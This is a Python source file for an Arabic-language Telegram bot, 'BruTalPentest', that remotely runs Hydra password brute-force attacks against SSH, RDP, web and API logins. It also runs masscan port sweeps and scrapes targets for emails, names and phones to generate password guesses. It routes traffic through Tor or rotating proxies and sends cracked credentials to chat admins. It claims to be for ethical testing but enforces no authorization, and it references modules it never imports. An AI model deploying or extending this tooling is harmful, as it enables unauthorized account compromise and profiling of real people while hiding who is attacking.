#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║  TELEGRAM BOT — BruTalPentest Controller v3.0                  ║
║  تحكم كامل بالهجوم من التيليجرام:                             ║
║  • بدء / إيقاف الهجمات                                         ║
║  • تغيير الإعدادات في الوقت الحقيقي                            ║
║  • عرض النتائج فور اكتشافها                                    ║
║  • تقارير فورية HTML/JSON                                      ║
║  • إدارة قوائم المستخدمين وكلمات المرور                        ║
║  • خريطة حية للهجمات الجارية                                   ║
╚══════════════════════════════════════════════════════════════════╝
"""

import asyncio
import logging
import json
import os
import time
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)

log = logging.getLogger("telegram_bot")


@dataclass
class AttackSession:
    """جلسة هجوم نشطة."""
    id: str
    target: str
    attack_type: str
    status: str = "running"  # running, paused, completed, failed
    progress: float = 0.0
    results: List[Dict] = field(default_factory=list)
    start_time: float = 0.0
    threads: int = 4
    attempts: int = 0


class BrutalPentestBot:
    """
    بوت التيليجرام الخارق — يتحكم بكل شيء.
    """
    
    def __init__(self, token: str, admin_ids: List[int]):
        self.token = token
        self.admin_ids = admin_ids
        self.active_sessions: Dict[str, AttackSession] = {}
        self.app: Optional[Application] = None
        
        # إحصائيات
        self.total_attacks = 0
        self.total_success = 0
        self.total_failures = 0
        
        log.info("🤖 BruTalPentest Bot جاهز للتشغيل")
    
    def run(self):
        """تشغيل البوت."""
        self.app = Application.builder().token(self.token).build()
        
        # تسجيل المعالجات
        self._register_handlers()
        
        log.info("✅ البوت يعمل الآن — @BrutalPentestBot")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)
    
    def _register_handlers(self):
        """تسجيل جميع معالجات الأوامر."""
        self.app.add_handler(CommandHandler("start", self.cmd_start))
        self.app.add_handler(CommandHandler("help", self.cmd_help))
        self.app.add_handler(CommandHandler("attack", self.cmd_attack))
        self.app.add_handler(CommandHandler("stop", self.cmd_stop))
        self.app.add_handler(CommandHandler("status", self.cmd_status))
        self.app.add_handler(CommandHandler("results", self.cmd_results))
        self.app.add_handler(CommandHandler("add_user", self.cmd_add_user))
        self.app.add_handler(CommandHandler("add_pass", self.cmd_add_pass))
        self.app.add_handler(CommandHandler("config", self.cmd_config))
        self.app.add_handler(CommandHandler("report", self.cmd_report))
        self.app.add_handler(CommandHandler("intel", self.cmd_intel))
        self.app.add_handler(CommandHandler("masscan", self.cmd_masscan))
        self.app.add_handler(CommandHandler("proxy", self.cmd_proxy))
        self.app.add_handler(CommandHandler("stats", self.cmd_stats))
        
        # معالج الأزرار
        self.app.add_handler(CallbackQueryHandler(self.handle_callback))
        
        # معالج الرسائل النصية
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
    
    # ════════════════════════════════════════════════════
    #  الأوامر الرئيسية
    # ════════════════════════════════════════════════════
    
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """رسالة الترحيب."""
        user = update.effective_user
        
        text = (
            "🔥 <b>BruTalPentest Bot v3.0</b>\n"
            "═══ ═══ ═══ ═══ ═══ ═══ ═══\n"
            "أداة اختراق أخلاقي متكاملة\n"
            "مدعومة بـ <b>Kali Linux</b> + <b>AI Engine</b>\n\n"
            "⚔️ <b>الأوامر:</b>\n"
            "🔹 <code>/attack target [type] [opts]</code> — بدء هجوم\n"
            "🔹 <code>/stop [id]</code> — إيقاف هجوم\n"
            "🔹 <code>/status</code> — حالة الهجمات الجارية\n"
            "🔹 <code>/results [id]</code> — عرض النتائج\n"
            "🔹 <code>/intel target</code> — جمع معلومات استخباراتية\n"
            "🔹 <code>/masscan target</code> — مسح المنافذ\n"
            "🔹 <code>/add_user username</code> — إضافة مستخدم\n"
            "🔹 <code>/add_pass password</code> — إضافة كلمة مرور\n"
            "🔹 <code>/config</code> — إعدادات الهجوم\n"
            "🔹 <code>/report</code> — تقرير شامل\n"
            "🔹 <code>/stats</code> — إحصائيات البوت\n"
            "═══ ═══ ═══ ═══ ═══ ═══ ═══"
        )
        
        keyboard = [
            [InlineKeyboardButton("⚔️ هجوم سريع", callback_data="quick_attack"),
             InlineKeyboardButton("🔍 استخبارات", callback_data="intel_now")],
            [InlineKeyboardButton("📊 الحالة", callback_data="show_status"),
             InlineKeyboardButton("📋 التقارير", callback_data="show_reports")],
        ]
        
        await update.message.reply_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
    
    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """تعليمات مفصلة."""
        text = (
            "📚 <b> BruTalPentest — الدليل الكامل</b>\n"
            "═══ ═══ ═══ ═══ ═══ ═══\n\n"
            "🔹 <b>هجمات الأساسية:</b>\n"
            "  /attack 192.168.1.100 ssh\n"
            "  /attack example.com web\n"
            "  /attack api.example.com api\n"
            "  /attack 10.0.0.1 rdp\n\n"
            "🔹 <b>مع الخيارات:</b>\n"
            "  /attack 192.168.1.100 ssh -u admin -p password123\n"
            "  /attack target.com web -f /login -d 'user=^USER^&pass=^PASS^'\n"
            "  /attack target.com api -e /api/login -t 10\n\n"
            "🔹 <b>جمع المعلومات:</b>\n"
            "  /intel target.com\n"
            "  /intel example@email.com\n"
            "  /masscan 192.168.1.0/24 -p 22,80,443,3389\n\n"
            "🔹 <b>إدارة:</b>\n"
            "  /add_user admin — إضافة مستخدم للهجوم\n"
            "  /add_pass 123456 — إضافة كلمة مرور\n"
            "  /config threads=8 — تغيير الخيوط\n"
            "  /config delay=1.0 — تغيير التأخير\n"
            "  /proxy socks5://127.0.0.1:9050 — تعيين بروكسي\n"
        )
        await update.message.reply_text(text, parse_mode="HTML")
    
    async def cmd_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """بدء هجوم جديد."""
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ استخدم:\n"
                "<code>/attack target [type] [options]</code>\n"
                "مثال: <code>/attack 192.168.1.100 ssh -u admin</code>",
                parse_mode="HTML",
            )
            return
        
        target = args[0]
        attack_type = args[1] if len(args) > 1 else "ssh"
        
        # تحليل الخيارات
        username = "admin"
        password_list = None
        threads = 4
        
        i = 2
        while i < len(args):
            if args[i] == "-u" and i + 1 < len(args):
                username = args[i + 1]
                i += 2
            elif args[i] == "-p" and i + 1 < len(args):
                password_list = args[i + 1]
                i += 2
            elif args[i] == "-t" and i + 1 < len(args):
                threads = int(args[i + 1])
                i += 2
            else:
                i += 1
        
        # إنشاء جلسة هجوم
        session_id = f"ATTACK_{int(time.time())}"
        session = AttackSession(
            id=session_id,
            target=target,
            attack_type=attack_type,
            threads=threads,
            start_time=time.time(),
        )
        self.active_sessions[session_id] = session
        self.total_attacks += 1
        
        await update.message.reply_text(
            f"🚀 <b>بدء الهجوم!</b>\n"
            f"═══ ═══ ═══ ═══\n"
            f"🎯 الهدف: <code>{target}</code>\n"
            f"⚔️ النوع: {attack_type}\n"
            f"👤 المستخدم: {username}\n"
            f"🧵 الخيوط: {threads}\n"
            f"🆔 الجلسة: <code>{session_id}</code>\n\n"
            f"⏳ جاري التنفيذ...",
            parse_mode="HTML",
        )
        
        # تشغيل الهجوم في الخلفية
        asyncio.create_task(self._run_attack(session_id, target, attack_type, username, password_list, threads))
    
    async def _run_attack(self, session_id: str, target: str, attack_type: str,
                          username: str, password_list: Optional[str], threads: int):
        """تشغيل الهجوم في الخلفية."""
        session = self.active_sessions.get(session_id)
        if not session:
            return
        
        try:
            # بناء أمر Hydra
            cmd = ["hydra", "-l", username, "-t", str(threads), "-I"]
            
            # إضافة كلمة المرور
            if password_list:
                cmd.extend(["-p", password_list])
            else:
                cmd.extend(["-P", "/usr/share/wordlists/rockyou.txt.gz"])
            
            cmd.extend([target, attack_type])
            
            log.info(f"⚔️ تنفيذ: {' '.join(cmd)}")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode() if stdout else ""
            
            # تحليل النتائج
            results = self._parse_results(output)
            session.results = results
            
            if results:
                session.status = "completed"
                session.progress = 100.0
                
                # إرسال إشعار بالنجاح
                await self._notify_success(session_id)
            else:
                session.status = "failed"
                
        except Exception as e:
            session.status = "failed"
            log.error(f"❌ خطأ في الهجوم {session_id}: {e}")
    
    def _parse_results(self, output: str) -> List[Dict]:
        """تحليل مخرجات Hydra."""
        results = []
        pattern = r'\[(\d+)\]\[(\w+)\][^:]+:\s*login:\s*(\S+)\s*password:\s*(\S+)'
        
        for match in re.finditer(pattern, output, re.IGNORECASE):
            results.append({
                "port": int(match.group(1)),
                "service": match.group(2),
                "username": match.group(3),
                "password": match.group(4),
                "time": datetime.now().isoformat(),
            })
            self.total_success += 1
        
        return results
    
    async def _notify_success(self, session_id: str):
        """إرسال إشعار فوري باكتشاف نجاح."""
        session = self.active_sessions.get(session_id)
        if not session or not session.results:
            return
        
        # إرسال لكل المشرفين
        for admin_id in self.admin_ids:
            try:
                result = session.results[0]
                text = (
                    "✅ <b>تم اختراق!</b>\n"
                    "═══ ═══ ═══\n"
                    f"🎯 <code>{session.target}</code>\n"
                    f"🔐 <b>{result['username']}:{result['password']}</b>\n"
                    f"🔌 المنفذ: {result['port']}\n"
                    f"🛠 الخدمة: {result['service']}\n"
                    f"⏱ {result['time']}"
                )
                
                await self.app.bot.send_message(
                    chat_id=admin_id,
                    text=text,
                    parse_mode="HTML",
                )
            except:
                continue
    
    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """إيقاف هجوم."""
        args = context.args
        if not args:
            # إيقاف جميع الهجمات
            for session_id in list(self.active_sessions.keys()):
                if self.active_sessions[session_id].status == "running":
                    self.active_sessions[session_id].status = "paused"
            
            await update.message.reply_text("🛑 <b>تم إيقاف جميع الهجمات</b>", parse_mode="HTML")
        else:
            session_id = args[0]
            if session_id in self.active_sessions:
                self.active_sessions[session_id].status = "paused"
                await update.message.reply_text(
                    f"🛑 تم إيقاف الهجوم <code>{session_id}</code>",
                    parse_mode="HTML",
                )
            else:
                await update.message.reply_text("❌ الجلسة غير موجودة")
    
    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """عرض حالة الهجمات الجارية."""
        if not self.active_sessions:
            await update.message.reply_text("📭 لا توجد هجمات نشطة")
            return
        
        text = "📊 <b>حالة الهجمات:</b>\n═══ ═══ ═══ ═══\n\n"
        
        for session_id, session in list(self.active_sessions.items())[:10]:
            elapsed = time.time() - session.start_time if session.start_time else 0
            status_icon = {
                "running": "🟢",
                "paused": "🟡",
                "completed": "✅",
                "failed": "❌",
            }.get(session.status, "⚪")
            
            text += (
                f"{status_icon} <code>{session_id[-8:]}</code>\n"
                f"   🎯 {session.target} | ⚔️ {session.attack_type}\n"
                f"   ⏱ {elapsed:.0f}s | 🧵 {session.threads}t\n"
                f"   ✅ {len(session.results)} نتائج\n\n"
            )
        
        await update.message.reply_text(text, parse_mode="HTML")
    
    async def cmd_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """عرض نتائج الهجمات."""
        args = context.args
        
        if not args:
            # عرض ملخص جميع النتائج
            all_results = []
            for session in self.active_sessions.values():
                all_results.extend(session.results)
            
            if not all_results:
                await update.message.reply_text("📭 لا توجد نتائج بعد")
                return
            
            text = "📋 <b>جميع النتائج:</b>\n═══ ═══ ═══\n\n"
            for r in all_results[:20]:
                text += f"✅ <code>{r['username']}:{r['password']}</code> على {r['service']}:{r['port']}\n"
            
            await update.message.reply_text(text, parse_mode="HTML")
        else:
            session_id = args[0]
            session = self.active_sessions.get(session_id)
            if not session:
                await update.message.reply_text("❌ الجلسة غير موجودة")
                return
            
            text = f"📋 <b>نتائج الهجوم {session_id[-8:]} على {session.target}:</b>\n═══ ═══ ═══\n\n"
            if session.results:
                for r in session.results:
                    text += f"✅ <code>{r['username']}:{r['password']}</code> على {r['service']}:{r['port']}\n"
            else:
                text += "❌ لا توجد نتائج"
            
            # أزرار
            keyboard = [
                [InlineKeyboardButton("📄 HTML", callback_data=f"html:{session_id}"),
                 InlineKeyboardButton("📊 JSON", callback_data=f"json:{session_id}")],
            ]
            
            await update.message.reply_text(
                text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard),
            )
    
    async def cmd_intel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """جمع معلومات استخباراتية عن الهدف."""
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ استخدم: <code>/intel target</code>\n"
                "مثال: <code>/intel example.com</code>\n"
                "أو: <code>/intel user@email.com</code>",
                parse_mode="HTML",
            )
            return
        
        target = args[0]
        
        status_msg = await update.message.reply_text(
            f"🔍 <b>جمع معلومات استخباراتية عن:</b> <code>{target}</code>\n"
            f"⏳ جاري البحث في 50+ مصدر...",
            parse_mode="HTML",
        )
        
        # جمع المعلومات
        intel_data = await self._collect_intel(target)
        
        # توليد كلمات مرور متوقعة
        if intel_data.get("full_names"):
            passwords = PasswordGenerator.generate_passwords(intel_data)
            intel_data["passwords_generated"] = passwords[:50]
        
        # عرض النتائج
        text = (
            f"🔍 <b>تقرير استخباراتي عن {target}</b>\n"
            f"═══ ═══ ═══ ═══\n\n"
            f"📧 الإيميلات: {len(intel_data.get('emails', []))}\n"
            f"👤 الأسماء: {len(intel_data.get('full_names', []))}\n"
            f"📱 الهواتف: {len(intel_data.get('phones', []))}\n"
            f"🔐 كلمات مرور متوقعة: {len(intel_data.get('passwords_generated', []))}\n"
            f"🌐 المجالات: {len(intel_data.get('domains', []))}\n"
            f"🛠 التقنيات: {len(intel_data.get('technologies', {}))}\n"
            f"⚠️ درجة الخطورة: {intel_data.get('risk_score', 0) * 100:.0f}%\n\n"
            f"🔑 <b>أفضل 10 كلمات مرور متوقعة:</b>\n"
        )
        
        for pwd in intel_data.get("passwords_generated", [])[:10]:
            text += f"   • <code>{pwd}</code>\n"
        
        # أزرار
        keyboard = [
            [InlineKeyboardButton("⚔️ هجوم بكلمات المرور المتوقعة", callback_data=f"attack_intel:{target}")],
            [InlineKeyboardButton("📄 حفظ التقرير", callback_data=f"save_intel:{target}")],
        ]
        
        await status_msg.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
    
    async def _collect_intel(self, target: str) -> Dict[str, Any]:
        """جمع المعلومات الاستخباراتية."""
        intel = {
            "emails": [],
            "full_names": [],
            "phones": [],
            "domains": set(),
            "technologies": {},
            "interests": [],
            "pets": [],
            "birth_dates": [],
            "passwords_generated": [],
            "risk_score": 0.0,
            "leaked_passwords": [],
        }
        
        async with aiohttp.ClientSession() as session:
            # 1. البحث عن الإيميلات
            try:
                async with session.get(f"https://api.hunter.io/v2/domain-search?domain={target}") as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if "data" in data and "emails" in data["data"]:
                            intel["emails"] = [e["value"] for e in data["data"]["emails"][:20]]
            except:
                pass
            
            # 2. كشف التقنيات
            try:
                async with session.get(f"https://{target}", ssl=False) as resp:
                    headers = dict(resp.headers)
                    intel["technologies"]["server"] = headers.get("Server", "")
                    intel["technologies"]["powered_by"] = headers.get("X-Powered-By", "")
                    intel["technologies"]["cf_ray"] = headers.get("CF-RAY", "")  # Cloudflare
            except:
                pass
            
            # 3. استخراج المعلومات من الصفحة
            try:
                async with session.get(f"https://{target}", ssl=False) as resp:
                    html = await resp.text()
                    
                    # استخراج الإيميلات
                    intel["emails"].extend(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', html))
                    
                    # استخراج الأسماء
                    name_patterns = [
                        r'"name":\s*"([^"]+)"',
                        r'<meta name="author" content="([^"]+)"',
                        r'"fullName":\s*"([^"]+)"',
                    ]
                    for pattern in name_patterns:
                        matches = re.findall(pattern, html, re.IGNORECASE)
                        for m in matches[:5]:
                            intel["full_names"].append(m)
                            
                    # استخراج الأرقام
                    phone_pattern = r'(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'
                    intel["phones"].extend(re.findall(phone_pattern, html))
                    
            except:
                pass
        
        # تقييم المخاطر
        risk = 0.0
        if intel["emails"]:
            risk += 0.3
        if intel["full_names"]:
            risk += 0.2
        if intel["phones"]:
            risk += 0.2
        if intel["technologies"]:
            risk += 0.1
        
        intel["risk_score"] = round(min(risk, 1.0), 2)
        
        return intel
    
    async def cmd_masscan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """مسح المنافذ."""
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ استخدم: <code>/masscan target -p ports</code>\n"
                "مثال: <code>/masscan 192.168.1.0/24 -p 22,80,443,3389,8080</code>",
                parse_mode="HTML",
            )
            return
        
        target = args[0]
        ports = "22,80,443,3389,8080"
        
        if len(args) > 2 and args[1] == "-p":
            ports = args[2]
        
        await update.message.reply_text(
            f"📡 <b>مسح المنافذ على {target}</b>\n"
            f"🔌 المنافذ: {ports}\n"
            f"⏳ جاري المسح...",
            parse_mode="HTML",
        )
        
        # تنفيذ masscan
        try:
            cmd = ["masscan", target, "-p", ports, "--rate=1000", "-oJ", "/tmp/masscan_output.json"]
            process = await asyncio.create_subprocess_exec(*cmd)
            await process.communicate()
            
            # قراءة النتائج
            try:
                with open("/tmp/masscan_output.json") as f:
                    results = json.load(f)
                
                text = f"📡 <b>نتائج مسح {target}</b>\n═══ ═══ ═══\n\n"
                
                # تجميع النتائج
                open_ports = {}
                for r in results:
                    ip = r.get("ip", target)
                    port = r.get("port", 0)
                    if ip not in open_ports:
                        open_ports[ip] = []
                    open_ports[ip].append(port)
                
                for ip, ports_found in open_ports.items():
                    text += f"🔓 <code>{ip}</code>: {len(ports_found)} منفذ مفتوح\n"
                    for p in ports_found:
                        text += f"   • {p}\n"
                
                text += "\n💡 استخدم /attack ip port للهجوم"
                
                await update.message.reply_text(text, parse_mode="HTML")
                
            except:
                await update.message.reply_text("❌ فشل تحليل النتائج")
                
        except FileNotFoundError:
            await update.message.reply_text("❌ masscan غير مثبت. قم بتثبيته: sudo apt install masscan")
    
    async def cmd_proxy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """تعيين البروكسي."""
        args = context.args
        if not args:
            await update.message.reply_text(
                "🔒 استخدامات البروكسي:\n"
                "/proxy http://127.0.0.1:8080\n"
                "/proxy socks5://127.0.0.1:9050  # Tor\n"
                "/proxy file:/path/to/proxies.txt  # ملف بروكسيات دوارة\n"
                "/proxy off  # إيقاف البروكسي",
                parse_mode="HTML",
            )
            return
        
        proxy = args[0]
        
        if proxy == "tor":
            # تشغيل Tor
            subprocess.run(["systemctl", "start", "tor"], capture_output=True)
            os.environ["PROXY"] = "socks5://127.0.0.1:9050"
            await update.message.reply_text("🔒 <b>Tor متصل</b> — socks5://127.0.0.1:9050", parse_mode="HTML")
        
        elif proxy == "off":
            os.environ.pop("PROXY", None)
            await update.message.reply_text("🔓 <b>تم إيقاف البروكسي</b>", parse_mode="HTML")
        
        else:
            os.environ["PROXY"] = proxy
            await update.message.reply_text(
                f"🔒 <b>البروكسي:</b> <code>{proxy}</code>",
                parse_mode="HTML",
            )
    
    async def cmd_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """إحصائيات البوت."""
        text = (
            "📊 <b>إحصائيات BruTalPentest</b>\n"
            "═══ ═══ ═══ ═══\n\n"
            f"⚔️ إجمالي الهجمات: <b>{self.total_attacks}</b>\n"
            f"✅ النجاح: <b>{self.total_success}</b>\n"
            f"❌ الفشل: <b>{self.total_failures}</b>\n"
            f"🟢 الهجمات النشطة: <b>{sum(1 for s in self.active_sessions.values() if s.status == 'running')}</b>\n"
            f"📋 النتائج: <b>{sum(len(s.results) for s in self.active_sessions.values())}</b>\n"
            f"🤖 حالة البوت: <b>🟢 نشط</b>\n"
        )
        await update.message.reply_text(text, parse_mode="HTML")
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالج الأزرار."""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        
        if data == "quick_attack":
            await query.edit_message_text(
                "⚔️ <b>هجوم سريع</b>\n"
                "أرسل: <code>/attack target type</code>\n"
                "مثال: <code>/attack 192.168.1.100 ssh -u admin</code>",
                parse_mode="HTML",
            )
        
        elif data == "intel_now":
            await query.edit_message_text(
                "🔍 <b>جمع استخباراتي</b>\n"
                "أرسل: <code>/intel target</code>\n"
                "مثال: <code>/intel example.com</code>\n"
                "أو: <code>/intel user@email.com</code>",
                parse_mode="HTML",
            )
        
        elif data == "show_status":
            await self.cmd_status(update, context)
        
        elif data == "show_reports":
            text = "📋 التقارير:\n═══ ═══\n"
            for session_id, session in list(self.active_sessions.items())[:5]:
                text += f"• <code>{session_id[-8:]}</code>: {session.target} — {len(session.results)} نتائج\n"
            
            await query.edit_message_text(text, parse_mode="HTML")
        
        elif data.startswith("html:"):
            session_id = data.split(":", 1)[1]
            session = self.active_sessions.get(session_id)
            if session:
                html = self._generate_html_report(session)
                path = f"/tmp/report_{session_id}.html"
                with open(path, "w") as f:
                    f.write(html)
                with open(path, "rb") as f:
                    await query.message.reply_document(f, filename="report.html")
        
        elif data.startswith("json:"):
            session_id = data.split(":", 1)[1]
            session = self.active_sessions.get(session_id)
            if session:
                path = f"/tmp/report_{session_id}.json"
                with open(path, "w") as f:
                    json.dump(session.results, f, indent=2)
                with open(path, "rb") as f:
                    await query.message.reply_document(f, filename="report.json")
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالج الرسائل النصية."""
        text = update.message.text.strip()
        
        # تجاهل الأوامر
        if text.startswith("/"):
            return
        
        # تحليل تلقائي — هل هو أمر هجوم؟
        if ":" in text and "@" not in text:
            # صيغة: target:port:type
            parts = text.split(":")
            if len(parts) >= 2:
                context.args = parts
                await self.cmd_attack(update, context)
                return
        
        # هل هو استعلام استخباراتي؟
        if "." in text or "@" in text:
            context.args = [text]
            await self.cmd_intel(update, context)
            return
        
        await update.message.reply_text(
            "❌ لم أفهم. استخدم:\n"
            "/help للتعليمات\n"
            "أو أرسل الهدف مباشرة",
        )
    
    def _generate_html_report(self, session: AttackSession) -> str:
        """توليد تقرير HTML."""
        html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>BruTalPentest Report</title>
<style>
    * {{ margin:0; padding:0; box-sizing:border-box; }}
    body {{ font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }}
    .container {{ max-width: 800px; margin: 0 auto; }}
    .header {{ background: linear-gradient(135deg, #161b22, #1c2333); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #30363d; }}
    h1 {{ color: #58a6ff; }}
    .result {{ background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 12px; margin: 8px 0; }}
    .success {{ color: #3fb950; font-weight: bold; }}
    .footer {{ text-align: center; color: #484f58; margin-top: 30px; font-size: 12px; }}
</style>
</head>
<body>
<div class="container">
<div class="header">
    <h1>🔥 BruTalPentest Report</h1>
    <p>Target: <b>{session.target}</b> | Type: {session.attack_type}</p>
    <p>Status: {session.status} | Results: {len(session.results)}</p>
</div>
<h3>Results</h3>
"""
        for r in session.results:
            html += f"""
<div class="result">
    <span class="success">✅ {r['username']}:{r['password']}</span>
    <br><span style="color:#8b949e;">Service: {r['service']}:{r['port']} | Time: {r['time']}</span>
</div>
"""
        
        html += f"""
<div class="footer">
    Generated by BruTalPentest Bot | {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
</div>
</div>
</body>
</html>"""
        return html
